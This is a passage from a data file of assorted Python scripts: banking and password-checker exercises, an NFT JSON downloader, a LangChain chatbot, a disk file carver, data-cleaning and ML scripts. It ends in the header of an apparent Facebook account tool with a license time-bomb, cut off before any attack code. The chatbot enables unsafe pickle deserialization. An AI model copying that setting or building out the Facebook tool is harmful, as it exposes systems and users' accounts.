saques \u00e9 de: {numero_sques} de {LIMITE_SQUES} saques e seu limite di\u00e1rio \u00e9 de: R${limite:.2f}.\")\r\n                else:\r\n                    print(f\"N\u00e3o foi poss\u00edvel realizar a transa\u00e7\u00e3o, pois o saldo \u00e9 insuficiente. Seu saldo atual \u00e9: R${saldo:.2f}\")\r\n            else:\r\n                print(\"Valor de saque inv\u00e1lido.\")\r\n        else:\r\n            print(\"Voc\u00ea atingiu seu limite de saques, volte outro dia.\")\r\n\r\n    # Op\u00e7\u00e3o de extrato\r\n    elif opcao == \"e\":\r\n        # Exibe o extrato banc\u00e1rio com informa\u00e7\u00f5es sobre as transa\u00e7\u00f5es, saldo e limites\r\n        print(\"\\n>>>>>>>>>>>>>>> EXTRATO <<<<<<<<<<<<<<<\")\r\n        if extrato:\r\n            print(f\"\\n>>>>> Aqui est\u00e1 o seu extrato banc\u00e1rio <<<<< \\n{extrato} \\nSeu saldo \u00e9 de: R${saldo:.2f} \\nSeu Limite de saque di\u00e1rio \u00e9 de: R${limite:.2f} \\nSeu n\u00fameros de saques \u00e9 de: {numero_sques} saques \\nSeu limite de saques \u00e9 de: {LIMITE_SQUES} saques\")\r\n        else:\r\n            print(\"N\u00e3o foram realizadas movimenta\u00e7\u00f5es.\")\r\n\r\n    # Op\u00e7\u00e3o de sair do programa\r\n    elif opcao == \"q\":\r\n        break\r\n\r\n    # Op\u00e7\u00e3o inv\u00e1lida\r\n    else:\r\n        print(\"Opera\u00e7\u00e3o inv\u00e1lida, por favor selecione novamente a opera\u00e7\u00e3o desejada.\")\r\n",
    "import tkinter as tk\r\nfrom tkinter import ttk\r\nfrom tkinter import messagebox\r\nfrom tkinter import filedialog\r\nimport os\r\nimport time\r\nimport requests\r\nimport json\r\n\r\nclass RareFinderGUI:\r\n    def __init__(self, master):\r\n        self.master = master\r\n        master.title(\"Rare Finder\")\r\n\r\n        # Create widgets\r\n        self.base_url_label = ttk.Label(master, text=\"Base URL:\")\r\n        self.base_url_entry = ttk.Entry(master, width=50)\r\n        self.base_url_entry.insert(0, \"https://we-assets.pinit.io/J2Q2j6kpSg7tq8JzueCHNTQNcyNnQkvr85RhsFnYZWeG/f7ac2fd2-13c4-4ca1-85ee-962772caf73e\")\r\n\r\n        self.main_folder_label = ttk.Label(master, text=\"Main Folder Name:\")\r\n        self.main_folder_entry = ttk.Entry(master, width=50)\r\n        self.main_folder_entry.insert(0, \"OutPut Folder\")\r\n\r\n        self.delay_label = ttk.Label(master, text=\"Download Delay (seconds):\")\r\n        self.delay_entry = ttk.Entry(master, width=10)\r\n        self.delay_entry.insert(0, \"0.0001\")\r\n\r\n        self.directory_size_label = ttk.Label(master, text=\"Directory Size:\")\r\n        self.directory_size_entry = ttk.Entry(master, width=10)\r\n        self.directory_size_entry.insert(0, \"4444\")\r\n\r\n        self.keywords_label = ttk.Label(master, text=\"Keywords (comma-separated):\")\r\n        self.keywords_entry = ttk.Entry(master, width=50)\r\n\r\n        self.start_button = ttk.Button(master, text=\"Step 1: Download Directories\", command=self.step1_download)\r\n        self.search_button = ttk.Button(master, text=\"Step 2: Search Keywords\", command=self.step2_search)\r\n        self.select_directory_button = ttk.Button(master, text=\"Select Directory\", command=self.select_directory)\r\n\r\n        self.console_label = ttk.Label(master, text=\"Console:\")\r\n        self.console_text = tk.Text(master, width=80, height=20)\r\n\r\n        # Grid layout\r\n        self.base_url_label.grid(row=0, column=0, sticky=\"w\")\r\n        self.base_url_entry.grid(row=0, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.main_folder_label.grid(row=1, column=0, sticky=\"w\")\r\n        self.main_folder_entry.grid(row=1, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.delay_label.grid(row=2, column=0, sticky=\"w\")\r\n        self.delay_entry.grid(row=2, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.directory_size_label.grid(row=3, column=0, sticky=\"w\")\r\n        self.directory_size_entry.grid(row=3, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.keywords_label.grid(row=4, column=0, sticky=\"w\")\r\n        self.keywords_entry.grid(row=4, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.start_button.grid(row=5, column=0, columnspan=3, pady=10)\r\n        self.search_button.grid(row=6, column=0, columnspan=3, pady=10)\r\n        self.select_directory_button.grid(row=7, column=0, columnspan=3, pady=10)\r\n        self.console_label.grid(row=8, column=0, sticky=\"w\")\r\n        self.console_text.grid(row=9, column=0, columnspan=3, padx=10, pady=5, sticky=\"ew\")\r\n\r\n    def step1_download(self):\r\n        self.base_url = self.base_url_entry.get()\r\n        self.main_folder = self.main_folder_entry.get()\r\n        self.delay = float(self.delay_entry.get())\r\n        self.directory_size = int(self.directory_size_entry.get())\r\n\r\n        directories = {'': self.directory_size}  # Specified directory size\r\n\r\n        for directory, count in directories.items():\r\n            folder = os.path.join(self.main_folder, directory)\r\n            if not os.path.exists(folder):\r\n                os.makedirs(folder)\r\n\r\n            for i in range(0, count + 1):\r\n                url = f'{self.base_url}{directory}/{i}.json'\r\n                self.download_json(url)\r\n\r\n                time.sleep(self.delay)\r\n\r\n        messagebox.showinfo(\"Information\", \"Directory download process completed.\")\r\n        self.search_button.config(state=tk.NORMAL)\r\n\r\n    def download_json(self, url):\r\n        try:\r\n            response = requests.get(url)\r\n            if response.status_code == 200:\r\n                file_path = os.path.join(self.main_folder, f\"{url.split('/')[-1]}\")\r\n                with open(file_path, 'wb') as file:\r\n                    file.write(response.content)\r\n            else:\r\n                self.log(f\"Failed to download JSON from {url}. Status code: {response.status_code}\")\r\n        except Exception as e:\r\n            self.log(f\"Error downloading JSON from {url}: {e}\")\r\n\r\n    def step2_search(self):\r\n        keywords = [keyword.strip().lower() for keyword in self.keywords_entry.get().split(',')]\r\n        results = []\r\n\r\n        directory = self.main_folder_entry.get()\r\n        if directory and os.path.exists(directory):\r\n            self.log(f\"Searching directory: {directory}\")\r\n            for root, dirs, files in os.walk(directory):\r\n                for file in files:\r\n                    if file.endswith(\".json\"):\r\n                        file_path = os.path.join(root, file)\r\n                        self.log(f\"Searching file: {file_path",
    "import os\nimport faiss\nimport time\nfrom langchain_openai import OpenAIEmbeddings, OpenAI\nfrom langchain.memory import VectorStoreRetrieverMemory\nfrom langchain.chains import LLMChain\nfrom langchain_core.prompts import PromptTemplate\nfrom langchain.docstore import InMemoryDocstore\nfrom langchain_community.vectorstores import FAISS\nfrom dotenv import load_dotenv\n\n# Load environment variables from .env\nload_dotenv()\nOPENAI_API_KEY = os.environ.get(\"OPENAI_API_KEY\")\nBOT_MEM_DIR = os.environ.get(\"BOT_MEM_DIR\")\n\nclass ChatBot:\n    def __init__(self):\n        self.embedding_size = 1536\n        self.times = {}\n\n    def setup_embeddings(self):\n        start_time = time.time()\n        embeddings = OpenAIEmbeddings(openai_api_key=OPENAI_API_KEY)\n        end_time = time.time()\n        self.times['setup_embeddings'] = end_time - start_time\n        return embeddings\n\n    def setup_vectorstore(self, embeddings):\n        start_time = time.time()\n        if os.path.exists(BOT_MEM_DIR):\n            vectorstore = FAISS.load_local(\"bot_memory\", embeddings, allow_dangerous_deserialization=True)\n        else:\n            index = faiss.IndexFlatL2(self.embedding_size)\n            vectorstore = FAISS(embeddings, index, InMemoryDocstore({}), {})\n        end_time = time.time()\n        self.times['setup_vectorstore'] = end_time - start_time\n        return vectorstore\n\n    def setup_memory(self, vectorstore):\n        start_time = time.time()\n        retriever = vectorstore.as_retriever(search_kwargs=dict(k=3))  # 3 relevant references\n        memory = VectorStoreRetrieverMemory(retriever=retriever)\n        end_time = time.time()\n        self.times['setup_memory'] = end_time - start_time\n        return memory\n\n    def initialize_memory(self, memory):\n        start_time = time.time()\n        if not os.path.exists(BOT_MEM_DIR):\n            memory.save_context({\"System\": \"User is entering the chat...\"}, {\"AI\": \"Ready for messages.\"})\n        end_time = time.time()\n        self.times['initialize_memory'] = end_time - start_time\n        return memory\n\n    def setup_prompt(self):\n        start_time = time.time()\n        default_template = \"\"\"You are a chatbot having a conversation with a human.\n\n        Previous conversation:\n        {history}\n        Current conversation:\n        Human: {input}\n        AI:\"\"\"\n        prompt = PromptTemplate(input_variables=[\"history\", \"input\"], template=default_template)\n        end_time = time.time()\n        self.times['setup_prompt'] = end_time - start_time\n        return prompt\n\n    def call_provider(self, llm_chain, content):\n        start_time = time.time()\n        response = llm_chain.predict(input=content)\n        end_time = time.time()\n        self.times['call_provider'] = end_time - start_time\n        return response",
    "import os\nimport itertools\nimport sys\nimport time\nimport threading\n\ndef get_byte_sequences(mimetype):\n    sequences = {\n        \"jpg\": (b'\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a\\x46', b'\\xff\\xd9'),\n        \"png\": (b'\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a', b'\\x49\\x45\\x4e\\x44\\xae\\x42\\x60\\x82'),\n        \"pdf\": (b'%PDF-', b'%%EOF'),\n    }\n    return sequences.get(mimetype, (b'START_BYTES', b'END_BYTES'))\n\ndef loading_animation(event):\n    for c in itertools.cycle(['|', '/', '-', '\\\\']):\n        if event.is_set():\n            break\n        sys.stdout.write('\\r' + c + ' Scanning...')\n        sys.stdout.flush()\n        time.sleep(0.1)\n    sys.stdout.write('\\rDone!          \\n')\n\n\ndef recover_files(bytes_size, mimetype, source_drive, destination_directory, drive_letter):\n    start_seq, end_seq = get_byte_sequences(mimetype)\n    stop_event = threading.Event()\n    animation_thread = threading.Thread(target=loading_animation, args=(stop_event,))\n    print(\"This may take a while, depending on the size of the drive and the number of recoverable files.\")\n    animation_thread.start()\n    \n    try:\n        drive = f\"\\\\\\\\.\\\\{drive_letter}:\"\n        with open(drive, \"rb\") as fileD:\n            byte = fileD.read(bytes_size)\n            offs = 0\n            drec = False\n            rcvd = 0\n            \n            while byte:\n                found = byte.find(start_seq)\n                if found >= 0:\n                    drec = True\n                    recovered_file_path = os.path.join(destination_directory, f\"{rcvd}.{mimetype.split('/')[-1]}\")\n                    print(f\"==== Found {mimetype} at location: {hex(found + (bytes_size * offs))} ====\")\n                    with open(recovered_file_path, \"wb\") as fileN:\n                        fileN.write(byte[found:])\n                        while drec:\n                            byte = fileD.read(bytes_size)\n                            bfind = byte.find(end_seq)\n                            if bfind >= 0:\n                                fileN.write(byte[:bfind + 2])\n                                print(f\"==== Wrote {mimetype} to location: {recovered_file_path} ====\\n\")\n                                drec = False\n                                rcvd += 1\n                            else:\n                                fileN.write(byte)\n                byte = fileD.read(bytes_size)\n                offs += 1\n        print(\"Recovery operation completed.\")\n    except IOError as e:\n        print(f\"Failed to access drive or write file. Error: {e}\")\n",
    "import json\nimport copy\nimport random\nimport argparse\n\n\ndef pairwise(iterable):\n    a = iter(iterable)\n    return zip(a, a)\n\ndef format_conv(x):\n  turns = [turn for turn in x['result'].split('User:')]\n  processed_turns = []\n  try:\n    for turn in turns[1:]:\n      try:\n        user_msg, assistant_msg = turn.split('Assistant:')\n      except ValueError as e:\n        continue\n      processed_turns.append(user_msg.strip())\n      processed_turns.append(assistant_msg.strip())\n    \n    if bool(random.getrandbits(1)):\n      processed_turns[0] = processed_turns[0]+'\\n<image>'\n    else:\n      processed_turns[0] = '<image>\\n'+processed_turns[0]\n  except:\n    raise(Exception(x['result']))\n  conversations = []\n  for user_msg, assistant_msg in pairwise(processed_turns):\n    conversations.extend([\n      {\n        'from': 'human',\n        'value': user_msg,\n      },\n      {\n        'from': 'gpt',\n        'value': assistant_msg,\n      }\n    ])\n  \n  return {\n    'id': x['pair_id'], \n    'image': x['pair_id']+'.jpg',\n    'domain': x['domain'],\n    'conversations': conversations,\n    }\n\n\ndef clean_conv(x):\n  x_copy = copy.deepcopy(x)\n  conversations = []\n  for human_turn, gpt_turn in pairwise(x['conversations']):\n    if any(key in gpt_turn['value'].lower() for key in ['having access', 'without access', 'have access', 'access to the image', 'access to the actual image', 'without the actual image', 'not mentioned in the figure caption', 'not mentioned in the caption', 'not provided in the figure caption', 'not specified in the caption', 'not specified in the image caption', 'without seeing the', 'cannot see the', 'unable to view', 'unable to provide specific details', 'sorry', 'cannot directly view', 'cannot view the image', 'image itself is not available', 'image is not available']):\n      continue\n    \n    should_continue = False\n    for key in ['according to the description, ', 'based on the description, ', 'based on the description provided, ', 'based on the image description, ', 'according to the image description, ', 'while I cannot see the actual image, based on the description, ', 'yes, according to the image description, ', 'no, according to the image description, ', 'i cannot see the image, but based on the description, ', 'based on the figure caption, ', 'based on the caption, ', 'according on the figure caption, ', 'according on the caption, ', 'as an ai, i am unable to view the actual image. However, based on the figure caption, ', 'the figure caption describes ', 'yes, the figure caption mentions ', 'no, the figure caption mentions ', 'the figure caption mentions ', 'the caption mentions ', 'yes, according to the figure caption, ', 'no, according to the figure caption, ', 'according to the figure caption, ', 'the image description suggests that ', 'yes, based on the description, ', 'no, based on the description, ', 'according to the description provided, ', 'yes, according to the description, ', 'no, according to the description, ', 'the outcome mentioned in the description is that ', 'the description suggests that ', 'in the provided context, ', 'based on the provided context, ', 'according to the context provided, ', 'based on the context provided, ', 'yes, the context provided indicates that ', 'no, the context provided indicates that ', 'the context provided indicates that ', 'yes, based on the context provided, ', 'no, based on the context provided, ', 'yes, according to the context provided, ', 'no, according to the context provided, ', 'according to the context provided, ', 'the context provided suggests that ', 'yes, the context provided suggests that ', 'based on the image and the context provided, ', 'the context provided mentions that ', 'yes, the context provided mentions that ', 'yes, the context provided mentions ', 'the context provided mentions ', 'the image and context provided suggest that ', 'according to the provided context, ', 'according to the image and the provided context, ', 'based on the image and the provided context, ', 'yes, according to the figure and the provided context, ', 'according to the figure and the provided context, ', 'the provided context mentions that ', 'no, the image and the provided context indicate that ', 'the image, along with the provided context, suggests that ', 'based on the mri and the provided context, ', 'based on the ct image and the provided context, ', 'the histology image and the provided context suggest that ', 'based on the ct scan and the context provided, ', 'based on the information provided, ', 'based on the histologic section and the provided context, ', 'yes, there is another finding mentioned in the context, ', 'based on the histopathological features and the context provided, ']:\n      if gpt_turn['value'].lower().startswith(key):\n        gpt_turn['value'] = gpt_turn['value'][len(key):].capitalize()\n        if not any(key in gpt_turn['value'] for key in ['description', 'caption']):\n          conversations.extend([human_turn, gpt_turn])\n        sh",
    "from django.core.management.base import BaseCommand\nfrom scores.models import Team, Tournament, Fixture\n\nTEAMS = [\n    'Chelsea', 'Man City', 'Liverpool', 'West Ham', 'Arsenal', 'Wolves', 'Tottenham',\n    'Man Utd', 'Brighton', 'Crystal Palace', 'Everton', 'Leicester', 'Southampton',\n    'Brentford', 'Aston Villa', 'Watford', 'Leeds', 'Burnley', 'Norwich', 'Newcastle'\n]\n\nclass Command(BaseCommand):\n    help = 'Load EPL teams and fixtures'\n\n    def handle(self, *args, **kwargs):\n        # add the tournament\n        tournament = Tournament.objects.get_or_create(name=\"Premier League\")[0]\n\n        # add the teams\n        if Team.objects.count() == 0:\n            team_objs = [Team(name=team_name) for team_name in TEAMS]\n            teams = Team.objects.bulk_create(team_objs)\n            teams = Team.objects.all()\n        else:\n            teams = Team.objects.all()\n\n        # Next step: create a set of fixtures from the teams list\n\n        fixtures = []\n        for i in range(0, len(teams), 2):\n            fixtures.append(\n                Fixture(home_team=teams[i], away_team=teams[i+1], tournament=tournament)\n            )\n\n        # bulk create the fixtures\n        if Fixture.objects.count() == 0:\n            fixtures = Fixture.objects.bulk_create(fixtures)  ",
    "# import needed libraries\nimport string\n\n# Funny Colorful in ASCII when program start\ntitle = \"\"\"\\033[94m\n\\033[1;31m\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m     \\033[1;32m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;33m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;34m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m\n\\033[1;31m\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\\033[0m    \\033[1;32m\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;33m\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;34m\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\\033[0m\n\\033[1;31m\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\\033[0m    \\033[1;32m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;33m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m    \\033[1;34m\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m  \n\\033[1;31m\u2588\u2588\u2554\u2550\u2550\u2550\u255d\\033[0m     \\033[1;32m\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\\033[0m    \\033[1;33m\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\\033[0m    \\033[1;34m\u2588\u2588\u2554\u2550\u2550\u255d\\033[0m  \n\\033[1;31m\u2588\u2588\u2551\\033[0m         \\033[1;32m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\\033[0m    \\033[1;33m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\\033[0m    \\033[1;34m\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\033[0m\n\\033[1;31m\u255a\u2550\u255d\\033[0m         \\033[1;32m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;33m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\033[0m    \\033[1;34m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\033[0m\n\\033[1;31mPassword    \\033[1;32mSecurity    \\033[1;33mStrength    \\033[1;34mEvaluator\n\\033[0m\"\"\"\n\nprint(title)\n\ndef main():\n    # user add the password to check\n    password = input(\"\\033[1;31mEnter The Password: \\n\\033[0m\")\n    if password == \"\":\n        print(\"\\033[1;31mNo Input!! Try again\\n\\033[0m\")\n        return main()\n    \n    # get the length of passwrod that user added\n    lenght = len(password)\n    level = 0 \n    \n    # make a bool variables of rules we need to check out\n    lowercase = False\n    uppercase = False\n    digits = False\n    symbols = False\n\n    # loop in the password looking for if rules done\n    for i in password:\n        if i in string.ascii_lowercase:\n            lowercase = True\n        if i in string.ascii_uppercase:\n            uppercase = True\n        if i in string.digits:\n            digits = True\n        if i not in string.ascii_lowercase and i not in string.ascii_uppercase and i not in string.digits:\n            symbols = True\n    \n    # print new values of rules\n    print(\"\\nwhat we found in your password(\",password,\"):\")  \n    print(\"contain lowercase: \", lowercase)\n    print(\"contain uppercase: \", uppercase)\n    print(\"contain digits: \", digits)\n    print(\"contain symbols: \", symbols)\n    print(\"length of password: \", lenght)\n    \n    # here we decied what level of strong of the password\n    if lenght > 8:\n        level += 1\n\n    if lowercase == True:\n        level += 1\n\n    if uppercase == True:\n        level += 1\n\n    if digits == True:\n        level += 1\n\n    if symbols == True:\n        level += 1\n\n    # if all done but password less than 6 letters wo it will be week password\n    if lenght < 6:\n        level = 1\n\n    # output how much password strong with some colors for every level\n    if level == 1:\n        print(\"\\033[1;31mWeek Password! level is:\",level,\"\\033[0m\")\n\n    if level == 2:\n        print(\"\\033[1;34mBad Password, level is:\",level,\"\\033[0m\")\n\n    if level == 3:\n        print(\"\\033[1;33mMedium Password, level is:\",level,\"\\033[0m\")\n\n    if level == 4:\n        print(\"\\033[1;92mGood Password, level is:\",level,\"\\033[0m\")\n\n    if level == 5:\n        print(\"\\033[1;32mStrong Password, level is:\",level,\"\\033[0m\")\n        \n    # ask for test other password\n    while True:\n        q = input(\"\\nAgain? (y/n) \")\n        if q == \"y\" or q == \"\":\n            return main()\n        elif q == \"n\":\n            exit()       \n        else:\n            print(\"\\033[1;31mwronge input!\\033[0m\")\n            \n# call main function\nmain()\n",
    "from math import sin, cos, atan2, radians, degrees\nfrom random import randint\nimport pygame as pg\n\nFLLSCRN = False         # True for Fullscreen, or False for Window\nBOIDZ = 130             # How many boids to spawn, may slow after 200ish\nWRAP = False            # False avoids edges, True wraps boids to other side\nFISH = False            # True will turn boids into fish\nBGCOLOR = (0, 0, 0)     # Background color in RGB\nWIDTH = 1200            # default 1200\nHEIGHT = 800            # default 800\nFPS = 48                # 48-90\n\nclass Boid(pg.sprite.Sprite):\n    def __init__(self, drawSurf, isFish=False, cHSV=None):\n        super().__init__()\n        self.drawSurf = drawSurf\n        self.image = pg.Surface((15, 15))\n        self.image.set_colorkey(0)\n        randColor = pg.Color(0)  # preps color so we can use hsva\n        if cHSV is None:\n            cHSV = (randint(0, 360), 85, 85, 100)  # Default values for hue, saturation, value, alpha\n        else:\n            cHSV += (100,)  # Adding default alpha value if not provided\n        randColor.hsva = cHSV\n        if isFish:\n            pg.draw.polygon(self.image, randColor, ((7,0), (12,5), (3,14), (11,14), (2,5), (7,0)), width=3)\n            self.image = pg.transform.scale(self.image, (18, 28))\n        else:\n            pg.draw.polygon(self.image, randColor, ((7,0), (13,14), (7,11), (1,14), (7,0)))\n        self.pSpace = (self.image.get_width() + self.image.get_height()) / 2\n        self.orig_image = pg.transform.rotate(self.image.copy(), -90)\n        self.direction = pg.Vector2(1, 0)  # sets up forward direction\n        dS_w, dS_h = self.drawSurf.get_size()\n        self.rect = self.image.get_rect(center=(randint(50, dS_w - 50), randint(50, dS_h - 50)))\n        self.angle = randint(0, 360)  # random start angle, and position ^\n        self.pos = pg.Vector2(self.rect.center)\n\n    def update(self, allBoids, dt, ejWrap=False):  # behavior\n        selfCenter = pg.Vector2(self.rect.center)\n        curW, curH = self.drawSurf.get_size()\n        turnDir = xvt = yvt = yat = xat = 0\n        turnRate = 120 * dt\n        margin = 48\n        neiboids = sorted([  # gets list of nearby boids, sorted by distance\n            iBoid for iBoid in allBoids\n            if pg.Vector2(iBoid.rect.center).distance_to(selfCenter) < self.pSpace*12 and iBoid != self ],\n            key=lambda i: pg.Vector2(i.rect.center).distance_to(selfCenter)) # 200\n        del neiboids[7:]  # keep 7 closest, dump the rest\n        ncount = len(neiboids)\n        if ncount > 1:  # when boid has neighborS (walrus sets ncount)\n            nearestBoid = pg.Vector2(neiboids[0].rect.center)\n            for nBoid in neiboids:  # adds up neighbor vectors & angles for averaging\n                xvt += nBoid.rect.centerx\n                yvt += nBoid.rect.centery\n                yat += sin(radians(nBoid.angle))\n                xat += cos(radians(nBoid.angle))\n            tAvejAng = degrees(atan2(yat, xat)) #round()\n            targetV = (xvt / ncount, yvt / ncount)\n            # if too close, move away from closest neighbor\n            if selfCenter.distance_to(nearestBoid) < self.pSpace : targetV = nearestBoid\n            tDiff = targetV - selfCenter  # get angle differences for steering\n            tDistance, tAngle = pg.math.Vector2.as_polar(tDiff)\n            # if boid is close enough to neighbors, match their average angle\n            if tDistance < self.pSpace*6 : tAngle = tAvejAng # and ncount > 2\n            # computes the difference to reach target angle, for smooth steering\n            angleDiff = (tAngle - self.angle) + 180\n            if abs(tAngle - self.angle) > .8: turnDir = (angleDiff / 360 - (angleDiff // 360)) * 360 - 180\n            # if boid gets too close to target, steer away\n            if tDistance < self.pSpace and targetV == nearestBoid : turnDir = -turnDir\n        # Avoid edges of screen by turning toward the edge normal-angle\n        if not ejWrap and min(self.pos.x, self.pos.y, curW - self.pos.x, curH - self.pos.y) < margin:\n            if self.pos.x < margin : tAngle = 0\n            elif self.pos.x > curW - margin : tAngle = 180\n            if self.pos.y < margin : tAngle = 90\n            elif self.pos.y > curH - margin : tAngle = 270\n            angleDiff = (tAngle - self.angle) + 180\n            turnDir = (angleDiff / 360 - (angleDiff // 360)) * 360 - 180\n            edgeDist = min(self.pos.x, self.pos.y, curW - self.pos.x, curH - self.pos.y)\n            turnRate = turnRate + (1 - edgeDist / margin) * (20 - turnRate) #minRate+(1-dist/margin)*(maxRate-minRate)\n        if turnDir != 0:  # steers based on turnDir, handles left or right\n            self.angle += turnRate * abs(turnDir) / turnDir\n            self.angle %= 360\n        # adjusts angle of boid image to match heading\n        self.image = pg.transform.rotate(self.orig_image, -self.angle)\n        self.rect = self.image.get_rect(center=self.rect.center)  # recentering fix\n        self.direction = pg.Vector2(1, 0).rotate(self.angle).",
    "import pandas as pd\nfrom textblob import TextBlob\nimport spacy\nimport textstat\nfrom spacy.lang.en.stop_words import STOP_WORDS\nfrom transformers import DistilBertForSequenceClassification, Trainer, TrainingArguments\nfrom transformers import DistilBertTokenizerFast\nfrom datasets import Dataset\nfrom sklearn.metrics import accuracy_score\nfrom transformers import EvalPrediction\nimport numpy as np\n\n# Initialize spaCy\nnlp = spacy.load(\"en_core_web_sm\")\n\n# Load dataset\ndf = pd.read_csv('Random_sampling.csv')\nprint(\"1\")\n\n# Define a mapping from label strings to integers\nlabel_to_int = {\"FAKE\": 0, \"REAL\": 1}\n\n# Apply this mapping to your labels\ndf['label'] = df['label'].map(label_to_int)\nprint(\"1.1\")\n\n# Preprocessing function for NER\ndef preprocess_text_for_ner(text):\n    doc = nlp(text)\n    preprocessed_text = ' '.join([token.lemma_.lower() for token in doc if token.text.lower() not in STOP_WORDS and token.is_alpha])\n    return preprocessed_text\n\ndf['preprocessed_text'] = df['text'].apply(preprocess_text_for_ner)\n\n# Additional text analyses\ndf['article_length'] = df['text'].apply(lambda x: len(x.split()))\ndf['sentiment'] = df['text'].apply(lambda x: TextBlob(x).sentiment.polarity)\ndf['readability'] = df['text'].apply(lambda x: textstat.flesch_reading_ease(x))\ndf['entities_count'] = df['text'].apply(lambda x: len(nlp(x).ents))\nprint(\"2\")\n\n\ntokenizer = DistilBertTokenizerFast.from_pretrained('distilbert-base-uncased')\n\ndef tokenize_function(examples):\n    return tokenizer(examples['text'], padding=\"max_length\", truncation=True)\n    #return tokenizer(examples['preprocessed_text'], padding=\"max_length\", truncation=True)  \n\n#hf_dataset = Dataset.from_pandas(df[['preprocessed_text', 'label']])\nhf_dataset = Dataset.from_pandas(df[['text', 'label']])\ntokenized_dataset = hf_dataset.map(tokenize_function, batched=True)\ntrain_test_dataset = tokenized_dataset.train_test_split(test_size=0.2)\nprint(\"3\")\nmodel = DistilBertForSequenceClassification.from_pretrained('distilbert-base-uncased', num_labels=2)\nprint(\"3\")\ntraining_args = TrainingArguments(\n    output_dir='./results',\n    num_train_epochs=3,\n    per_device_train_batch_size=8,\n    warmup_steps=500,\n    weight_decay=0.01,\n    logging_dir='./logs',\n)\n\ndef compute_metrics(p: EvalPrediction):\n    preds = np.argmax(p.predictions, axis=1)\n    accuracy = accuracy_score(p.label_ids, preds)\n    # Ensure the key matches what you expect\n    return {\"eval_accuracy\": accuracy}\n\n\n# Include the compute_metrics function in your Trainer setup\ntrainer = Trainer(\n    model=model,\n    args=training_args,\n    train_dataset=train_test_dataset['train'],\n    eval_dataset=train_test_dataset['test'],\n    compute_metrics=compute_metrics,\n)\n\ntrainer.train()\n\nresults = trainer.evaluate()\nprint(results)\n\nprint(\"Test set accuracy:\", results['eval_accuracy'])\n\n\n",
    "#Decoded By Hso AND Levi: @sis_f  On: @Q_B_H \n\n\n\nfoo = False\nif foo:\n    pass\nimport random\nimport re\nimport time\nimport sys\nimport requests\nfrom time import time as mek\nfrom bs4 import BeautifulSoup as par\nfrom rich.progress import Progress, TextColumn\nfrom concurrent.futures import ThreadPoolExecutor as Modol\nimport requests\nimport bs4\nimport json\nimport os\nimport sys\nimport random\nimport datetime\nimport time\nimport re\nimport threading\nimport urllib3\nimport rich\nimport base64\nimport threading\nfrom rich.table import Table as me\nfrom rich.console import Console as sol\nfrom bs4 import BeautifulSoup as sop\nfrom bs4 import BeautifulSoup as parser\nfrom concurrent.futures import ThreadPoolExecutor as tred\nfrom rich.console import Group as gp\nfrom rich.panel import Panel as nel\nfrom rich import print as cetak\nfrom rich.markdown import Markdown as mark\nfrom rich.columns import Columns as col\nfrom rich import print as rprint\nfrom rich import pretty\nfrom rich.text import Text as tekz\nimport os\nnow = datetime.datetime.today()\nmm = str(now.month)\ndd = str(now.day)\nyyyy = str(now.year)\nhour = str(now.hour)\nmi = str(now.minute)\nss = str(now.second)\nt = mm + '''/''' + dd + '''/''' + yyyy + ''' ''' + hour + ''':''' + mi + ''':''' + ss\nhours = now.hour\nx = datetime.datetime.now()\ng = datetime.datetime(2023, 9, 8, 1, 0, 0)\nif x.strftime('''%x''') > g.strftime('''%x'''):\n    print('''\n\n''')\n    print('''     ''' + ' \u0627\u0646\u062a\u0647\u0626 \u0627\u0644\u062a\u0641\u0639\u064a\u0644 \u0631\u0627\u0633\u0644 \u0627\u0644\u0645\u0637\u0648\u0631 \u0644\u0644\u062d\u0635\u0648\u0644 \u0639 \u0627\u062d\u062f\u062b \u0646\u0633\u062e\u0647@XD_0O')\n    print('''\n\n''')\n    print(x)\n    sys.exit(0)\nif x.strftime('''%x''') == g.strftime('''%x'''):\n    print('''''')\n    if x.strftime('''%X''') > g.strftime('''%X'''):\n        print('''\n\n''')\n        print('''     ''' + ' \u062a\u0631\u064a\u062f \u062a\u0641\u0639\u0628\u0644 \u0627\u062f\u0627\u0629 \u0631\u0627\u0633\u0644\u0646\u064a \u0648\u062d\u0636\u0631 \u0645\u0642\u0627\u0628\u0644\u0643 @XD_0O')\n        print('''\n\n''')\n        print(x)\n        sys.exit(0)\n    else:\n        print('''''')\nelse:\n    print('''''')\nprint('''''')\n\ntry:\n    import rich\nexcept:\n    pass\ncetak(nel('\\t\u2022WELCOME MY TOOL FACEBOOK\u2022'))\nos.system('''pip install rich''')\n\ntry:\n    import stdiomask\nexcept:\n    pass\ncetak(nel('\\t\u2022 WELCOME MY TOOL FACEBOOK \u2022'))\nos.system('''pip install stdiomask''')\n\ntry:\n    import requests\nexcept:\n    pass\nZ = '''\u001b[1;31m'''\nR = '''\u001b[1;31m'''\nX = 